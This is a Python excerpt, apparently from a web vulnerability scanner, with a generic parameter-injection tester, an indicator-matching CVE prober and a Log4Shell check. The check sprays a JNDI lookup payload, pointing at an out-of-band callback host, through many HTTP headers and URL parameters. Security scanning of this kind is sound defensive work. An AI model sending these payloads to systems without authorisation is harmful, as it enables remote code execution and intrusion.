    # ─── MISC SECURITY CHECKS (20 modules) ──────────────────────────

    def _generic_payload_test(self, payloads, vuln_name, severity, detector=None):
        """Generic payload injection tester — used by all payload-variant modules."""
        if not self.deep: return
        tested = set()
        for url, params in list(self.params_seen)[:5]:
            for p in params:
                if (url, p, vuln_name) in tested: continue
                tested.add((url, p, vuln_name))
                marker = "x" + "".join(random.choices(string.ascii_lowercase, k=6))
                for tpl in payloads:
                    payload = marker + tpl if isinstance(tpl, str) else tpl
                    test_url = self._inject(url, p, payload)
                    r = self._get(test_url)
                    if r and detector and detector(r.text or "", marker, tpl, payload):
                        self._add_vuln(vuln_name, severity, test_url,
                                       f"{p}={str(tpl)[:50]}",
                                       param=p, payload=payload)
                        return

    # 60 XSS payload variants (each different payload = different module)
    def _probe_cve(self, cve_id, paths, indicators, severity="HIGH"):
        """Generic CVE prober."""
        for path in paths:
            url = urljoin(self.target, path)
            r = self._get(url)
            if r and any(ind in (r.text or "") for ind in indicators):
                self._add_vuln(f"CVE {cve_id}", severity, url,
                                f"matched indicator",
                                path=path)
                return True
        return False

    def test_cve_2021_44228_log4shell(self):
        """CVE-2021-44228 — Log4Shell (Log4j RCE)."""
        if not self.oob_host:
            # Passive — just check if JNDI is accepted
            r = self._get(self.target, headers={"X-Api-Version": "${jndi:ldap://x/x}"})
            if r and "jndi" in (r.text or "").lower():
                self._add_vuln("CVE-2021-44228 (Log4Shell)", "CRITICAL",
                                self.target, "JNDI in response",
                                cve="CVE-2021-44228")
        else:
            # Active — inject JNDI payload with OOB
            token = f"log4j-{int(time.time())}"
            headers_to_inject = [
                "User-Agent", "X-Api-Version", "X-Forwarded-For",
                "Referer", "X-Application-Name", "X-Custom-Header",
                "Cookie", "Host", "Accept", "Accept-Encoding",
                "If-Modified-Since", "If-None-Match", "Origin",
                "X-Forwarded-Host", "X-Forwarded-Proto",
                "X-Real-IP", "X-Original-URL", "X-Rewrite-URL",
            ]
            payload = f"${{jndi:ldap://{token}.{self.oob_host}/x}}"
            for hdr in headers_to_inject:
                r = self._get(self.target, headers={hdr: payload})
            # Also via params
            for url, params in list(self.params_seen)[:10]:
                for p in params:
                    self._get(self._inject(url, p, payload))
            self._add_vuln("CVE-2021-44228 (Log4Shell OOB)", "CRITICAL",
                            self.target, f"JNDI payloads injected to {self.oob_host}/{token}",
                            cve="CVE-2021-44228")

